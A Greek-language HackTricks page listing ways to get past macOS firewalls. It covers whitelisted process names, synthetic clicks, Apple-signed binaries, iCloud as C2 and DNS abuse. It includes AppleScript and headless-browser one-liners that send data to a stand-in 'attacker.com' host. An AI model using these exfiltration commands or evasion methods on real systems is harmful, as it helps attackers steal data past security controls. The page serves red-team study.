# Διάβρωση Τειχών Προστασίας στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Τεχνικές που βρέθηκαν

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές τείχους προστασίας στο macOS.

### Κατάχρηση ονομάτων λευκής λίστας

* Για παράδειγμα, να ονομάζεται ο κακόβουλος κώδικας με ονόματα γνωστών διεργασιών του macOS όπως το **`launchd`**&#x20;

### Συνθετικό Κλικ

* Εάν το τείχος προστασίας ζητάει άδεια από τον χρήστη, ο κακόβουλος κώδικας μπορεί να **κάνει κλικ στο "επιτρέπω"**

### **Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple**

* Όπως το **`curl`**, αλλά και άλλα όπως το **`whois`**

### Γνωστοί τομείς της Apple

Το τείχος προστασίας μπορεί να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple, όπως το **`apple.com`** ή το **`icloud.com`**. Και η iCloud μπορεί να χρησιμοποιηθεί ως C2.

### Γενική Διάβαση

Ορισμένες ιδέες για να προσπαθήσετε να διαβείτε τα τείχη προστασίας

### Έλεγχος της επιτρεπόμενης κίνησης

Γνωρίζοντας την επιτρεπόμενη κίνηση, μπορείτε να αναγνωρίσετε δυνητικά τομείς που βρίσκονται στη λευκή λίστα ή ποιες εφαρμογές έχουν άδεια πρόσβασης σε αυτούς.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση του DNS

Οι αναλύσεις DNS γίνονται μέσω της εφαρμογής **`mdnsreponder`** που έχει υπογραφή και πιθανότατα θα επιτραπεί να επικοινωνήσει με τους διακομιστές DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω εφαρμογών περιήγησης

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Περιήγηση Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω εισαγωγής διεργασιών

Εάν μπορείτε να **εισάγετε κώδικα σε μια διεργασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, μπορείτε να παρακάμψετε τις προστασίες του τείχους προστασίας:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Αναφορές

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
